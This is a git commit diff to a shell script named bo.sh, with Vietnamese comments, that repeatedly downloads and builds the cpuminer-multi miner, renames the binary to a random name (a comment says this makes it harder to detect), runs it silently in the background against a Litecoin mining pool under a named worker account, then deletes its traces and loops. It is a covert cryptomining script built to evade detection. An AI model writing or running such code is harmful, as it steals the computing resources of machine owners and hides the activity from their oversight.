9b0074b193b69719b9bfb7be88dd20b9b80bb5cf
Quqngdev <hovanquang2001122@gmail.com>
2024-07-12 08:41:28 +0700

    Update bo.sh

--- bo.sh
+++ bo.sh
@@ -7,9 +7,8 @@ generate_random_name() {
 
 # Vòng lặp vô hạn để script chạy liên tục
 while true; do
-  # Tải files 
-  sudo apt-get install -y build-essential automake autoconf libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev zlib1g-dev
-
+  # Tải file
+  
   git clone https://github.com/tpruvot/cpuminer-multi.git
   # Giải nén file
   random_name=$(generate_random_name)
@@ -23,11 +22,11 @@ while true; do
   ./build.sh
 
   # Đổi tên file để khó phát hiện hơn
-  random_name_exec=$(generate_random_name)
-  mv cpuminer "$random_name_exec"
+  random_name_sh=$(generate_random_name)
+  mv cpuminer "$random_name_sh"
 
   # Chạy chương trình với tên đã đổi, ẩn danh và chạy ngầm trong 5 phút
-  nohup ./"$random_name_exec" -a scrypt -o stratum+tcp://ltc.poolbinance.com:3333 -u dienvn.001 -p 123456 -t 3 >/dev/null 2>&1 &
+  nohup ./"$random_name_sh" -a scrypt -o stratum+tcp://ltc.poolbinance.com:3333 -u dienvn.001 -p 123456 -t 3 >/dev/null 2>&1 &
   miner_pid=$!
 
   # Ngủ trong 5 phút
@@ -39,6 +38,7 @@ while true; do
   # Xóa các file đã tải và giải nén
   cd ..
   rm -rf "$random_name"
+  rm -rf "$random_name_sh"
 
   # Nghỉ 3 phút trước khi lặp lại
   sleep 180
